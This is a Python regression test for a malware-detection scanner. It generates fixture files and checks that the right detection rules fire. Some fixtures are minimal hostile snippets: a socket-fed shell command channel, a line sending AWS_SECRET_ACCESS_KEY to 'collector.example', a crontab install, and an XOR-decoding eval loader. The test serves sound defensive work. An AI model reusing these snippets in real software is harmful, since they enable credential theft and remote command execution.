#!/usr/bin/env python3
"""Regress unrelated-code and neutral-capability false positives found in PNG containers."""
import argparse
import base64
import json
import lzma
import os
from pathlib import Path
import random
import shutil
import struct
import subprocess
import tempfile
import zipfile

ROOT = Path(__file__).resolve().parents[2]
REMOTE = 'objectives/command-and-control/backdoor/tasking/socket::python-remote-command-channel'
CRON = 'micro-behaviors/os/autorun/cron::crontab-file-install'
TRACED = 'micro-behaviors/process/debug/detect::bsd-traced-process-flag-reference'
SERVICE = 'micro-behaviors/os/service/config::chkconfig-add-service'
FRAUD = 'objectives/lateral-movement/social-engineering/lures::advance-fee-fraud-letter'


def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument('--atomscan', default=str(ROOT.parent / 'scan/target/release/atomscan'))
    p.add_argument('--report', type=Path, required=True)
    p.add_argument('--write-fixtures', action='store_true')
    args = p.parse_args()
    cases = [
        ('independent.py', 'import socket, subprocess\ns = socket.socket()\ndata = s.recv(1024)\nprint(data)\nsubprocess.call("printf ok", shell=True)\n', None, 3),
        ('received.py', 'import socket, subprocess\ns = socket.socket()\ncommand = s.recv(1024).decode()\nsubprocess.call(command, shell=True)\n', REMOTE, 5),
        ('received-system.py', 'import socket, os\ns = socket.socket()\ncommand = s.recv(1024).decode()\nos.system(command)\n', 'objectives/command-and-control/remote-command/dispatch/command::recv-result-command-execution', 5),
        ('schedule.groovy', 'class Schedule { String crontabString; String label = "ssh executor shell" }\n', None, 3),
        ('cron.groovy', 'def command = "crontab /tmp/job"\ncommand.execute()\n', CRON, 5),
        ('debug.m', '#import <Foundation/Foundation.h>\n#if defined(DEBUG) || defined(NI_DEBUG)\nint attached(int flags) { return (flags & P_TRACED) != 0; }\n#endif\n', TRACED, 3),
        ('service.sh', '#!/bin/sh\n/sbin/chkconfig --add exampled\n', SERVICE, 3),
        ('news.txt', 'The NBA draft lottery determines the draft order.\n' + 'The local sports desk reports the season results. ' * 170 + '\nGot a confidential news tip? We want to hear from you.\n', None, 3),
        ('letter.txt', 'Lottery winner notice. Reference No: PRIZE/12345. Please reconfirm your information to claim the prize.\n', FRAUD, 4),
        ('secret-resource.py', 'import os, requests\nsecret = os.environ.get("BUILD_SECRET_RESOURCE", "")\nrequests.get("http://taskcluster/secrets/v1/secret/" + secret)\n', 'micro-behaviors/communications/http/request/client::taskcluster-secret-resource-get', 3),
        ('secret-egress.py', 'import os, requests\nkey = os.environ["AWS_SECRET_ACCESS_KEY"]\nrequests.get("https://collector.example/collect/" + key)\n', 'objectives/exfiltration/http/env::python-credential-env-url-path-exfil', 5),
        ('resource-and-egress.py', 'import os, requests\nsecret = os.environ.get("BUILD_SECRET_RESOURCE", "")\nrequests.get("http://taskcluster/secrets/v1/secret/" + secret)\nkey = os.environ["AWS_SECRET_ACCESS_KEY"]\nrequests.get("https://collector.example/collect/" + key)\n', 'objectives/exfiltration/http/env::python-credential-env-url-path-exfil', 5),
        ('crypto-vector.js', 'const vectors = [{key:[0xfffe0000,0,0,0],pt:[0,0,0,0]}]; console.log(vectors);\n', None, 3),
        ('tag-probe.js', 'if (tag === 0xfffe0000) console.log(tag);\n', 'micro-behaviors/mem/read/arbitrary::js-nan-boxed-pointer-tag-check', 4),
        ('hidden-filler.html', '<html><body><div style="display:none">' + 'x\n' * 10000 + '</div></body></html>', None, 3),
        ('hidden-blob.html', '<html><body><div style="display:none">' + base64.b64encode(random.Random(42).randbytes(12000)).decode() + '</div></body></html>', 'micro-behaviors/data/format/html::concealed-bulk-encoded-blob', 4),
        ('plain-frame.svg', '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="A test"></iframe></foreignObject><script>frames[0].onload = function() { frames[0].document.body.style.color="green"; };</script></svg>', None, 3),
        ('active-frame.svg', '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe></foreignObject></svg>', 'objectives/evasion/security-bypass/policy/browser::svg-xhtml-namespace-frame-script', 4),
        ('search-option.json', json.dumps({'manifest_version':2,'name':'Books','version':'1','chrome_settings_overrides':{'search_provider':{'name':'Books','search_url':'https://books.example/find?q={searchTerms}','suggest_url':'https://books.example/suggest?q={searchTerms}'}}}), 'metadata/permission/manifest::extension-custom-search-endpoint', 3),
        ('default-search.json', json.dumps({'manifest_version':2,'name':'Books','version':'1','chrome_settings_overrides':{'search_provider':{'name':'Books','is_default':True,'search_url':'https://books.example/find?q={searchTerms}'}}}), 'objectives/impact/ui/manipulation/traffic::extension-default-search-to-custom-endpoint', 4),
        ('polyfill.js', 'var root = Function("return this")(); fetch("/data.json").then(r=>r.json()); for(var i=0;i<a.length;i++){a[i]^=17;} localStorage.setItem("cache", a);\n', None, 3),
        ('dynamic-loader.js', 'fetch("/data.json").then(r=>r.json()).then(a=>{for(var i=0;i<a.length;i++){a[i]^=17;}localStorage.setItem("cache",a);localStorage.getItem("cache");(0,Function)(decoded)();});\n', 'objectives/anti-static/obfuscation/eval/loader::json-fetch-runtime-eval-xor-storage', 4),
    ]
    results = []
    with tempfile.TemporaryDirectory(prefix='png-context-') as temp:
        work = Path(temp)
        expected = {}
        generated = {}
        for index, (name, source, rule, cap) in enumerate(cases):
            target = work / f'asset{index:03d}{Path(name).suffix}'
            target.write_text(source)
            expected[target.name] = (name, rule, cap)
            generated[name] = target
        manifest = {'manifest_version': 2, 'name': 'Translation control', 'version': '1.0',
                    'permissions': ['<all_urls>'], 'background': {'scripts': ['background.js']}}
        source = '''browser.runtime.onInstalled.addListener(() => browser.storage.local.set({installed:true}));
browser.runtime.onMessage.addListener(message => fetch("https://translate.example/tts?q=" + message.text));
'''
        target = work / 'extension.xpi'
        with zipfile.ZipFile(target, 'w') as z:
            z.writestr('manifest.json', json.dumps(manifest))
            z.writestr('background.js', source)
        expected[target.name] = ('unrelated-install-and-tts.xpi', None, 3)
        generated['unrelated-install-and-tts.xpi'] = target
        body = random.Random(18).randbytes(16384)
        font = (b'wFOF' + b'\0\1\0\0' + struct.pack('>IHHIHHIIIII', 64 + len(body), 1, 0,
                28 + len(body), 1, 0, 0, 0, 0, 0, 0)
                + b'head' + struct.pack('>IIII', 64, len(body), len(body), 0) + body)
        target = work / 'damaged.woff'
        target.write_bytes(font)
        expected[target.name] = ('damaged.woff', 'metadata/file/format/media::font-woff-layout-signature-mismatch', 3)
        generated['damaged.woff'] = target
        target = work / 'opaque.woff'
        target.write_bytes(b'wFOF' + random.Random(19).randbytes(16384))
        expected[target.name] = ('opaque.woff', 'objectives/evasion/masquerade/extension-mismatch::font-named-file-is-opaque-blob', 4)
        generated['opaque.woff'] = target
        env = {**os.environ, 'CLEAVE_TRAITS_DIR': str(ROOT), 'SCAN_NO_ANALYSIS_CACHE': '1',
               'CLEAVE_SKIP_CACHE': '1', 'RAYON_NUM_THREADS': '2'}
        run = subprocess.run([args.atomscan, '--no-update', '--analyze=local', '--mode=slow',
                              '--follow=none', '--format=json', str(work)], env=env,
                             capture_output=True, text=True, timeout=300)
        assert run.returncode in (0, 1), run.stderr
        assert 'could not parse' not in run.stderr and 'skipped trait' not in run.stderr, run.stderr
        for line in run.stdout.split('\n'):
            if not line.strip(): continue
            report = json.loads(line)
            files = report['raw']['files']
            name, required, cap = expected.pop(Path(files[0]['path']).name)
            findings = [t for f in files for t in f.get('traits', [])]
            maximum = max((t['crit'] for t in findings), default=0)
            minimum = 4 if required and (required.startswith('objectives/') or required.endswith('js-nan-boxed-pointer-tag-check') or required.endswith('concealed-bulk-encoded-blob')) else 3
            passed = maximum <= cap and (required is None or any(t['id'] == required and t['crit'] >= minimum for t in findings))
            results.append({'case': name, 'passed': passed, 'required': required, 'max_crit': maximum,
                            'flags': [t for t in findings if t['crit'] >= 4]})
        assert not expected, expected
        args.report.parent.mkdir(parents=True, exist_ok=True)
        args.report.write_text(json.dumps({'cases': len(results), 'passed': sum(r['passed'] for r in results),
                                          'checks': results, 'stderr': run.stderr}, indent=2) + '\n')
        if args.write_fixtures and all(r['passed'] for r in results):
            for row in results:
                level = row['max_crit']
                label = 'hostile' if level == 5 else 'suspicious' if level == 4 else 'notable' if level == 3 else 'baseline'
                source = generated[row['case']]
                dest = ROOT / 'testdata' / label / 'generated/taxonomy/png-good-context' / row['case']
                dest.parent.mkdir(parents=True, exist_ok=True)
                if source.stat().st_size > 20 * 1024:
                    dest.with_name(dest.name + '.xz').write_bytes(lzma.compress(source.read_bytes()))
                else:
                    shutil.copy2(source, dest)
    failed = [r['case'] for r in results if not r['passed']]
    assert not failed, failed
    print(f'{len(results)}/{len(results)} PNG-container context regressions passed')


if __name__ == '__main__':
    main()
